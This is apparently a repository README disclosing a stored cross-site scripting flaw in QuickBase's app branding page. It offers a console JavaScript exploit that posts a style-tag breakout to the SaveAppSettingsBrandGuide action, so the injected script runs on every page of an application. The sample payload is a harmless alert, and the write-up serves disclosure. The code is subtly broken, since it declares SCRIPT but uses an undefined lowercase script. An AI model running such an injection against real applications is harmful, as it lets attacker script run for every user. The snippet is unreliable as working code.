#QuickBase XSS
This repository documents XSS injection vectors I've discovered in the QuickBase platform (http://www.quickbase.com).

##Branding Page Injection
This one requires admin privileges, so it isn't a major vulnerability. Why, then, is it interesting? *It allows arbitrary code to run application wide!* I see this being way more useful then nefarious.

#####How does it work?
Run the JavaScript below in your developer console while on the dashboard of the application you want to affect. It will issue a POST to the SaveAppSettingsBrandGuide action.

#####Why does it work?
QuickBase engineers only sanitized input client side on a value that gets inserted into every page in the application. Doh!

```
var DBID = "";
var REALM = "";
var SCRIPT = "alert('HELLO!');";
var token = $("[name=PageToken]").val();

$.ajax({
  url: "https://" + REALM + ".quickbase.com/db/" + DBID + "?a=SaveAppSettingsBrandGuide",
  type: "POST",
  data: {
    uiCustomTextColor: "</style><script>" + script + "</script><style>",
    PageToken: token,
    CustomHeader: "on",
    uiCustomHeaderOptions: "iBasic",
    apply: "Save"
  }
});
```
